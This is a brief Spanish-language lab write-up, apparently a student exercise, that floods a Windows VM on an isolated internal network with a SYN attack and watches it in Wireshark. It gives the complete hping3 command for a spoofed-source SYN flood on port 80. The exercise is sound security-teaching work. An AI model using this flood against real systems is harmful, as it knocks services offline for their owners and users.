Este laboratorio cuenta con dos máquina virtuales:
- Windows 10 con configuración de la red: red interna. IP 10.10.10.5
- Ubuntu 23.10 con configuración de la red: red interna. IP: 10.10.10.3

Comprobamos que las máquina virtuales se vean haciendo un ping:
![](capturas/ping.png)
![](capturas/ping.win.png)


En la máquina Windows:
- No hace falta desactivar el antivirus de Windows. Funciona igualmente.
- Abrimor Wireshark  para snifar el tráfico.

En la máquina Linux instalamos hping3 y lanzamos el ataque:
```
sudo apt-get install hping3
sudo hping3 -c 15000 -d 120 -S -w 64 -p 80 --flood --rand-source 10.10.10.5
```
![](capturas/Dos-1.png)


Comprobamos en Wireshark el ataque:
![](capturas/wireshark-Dos-Attack.png)
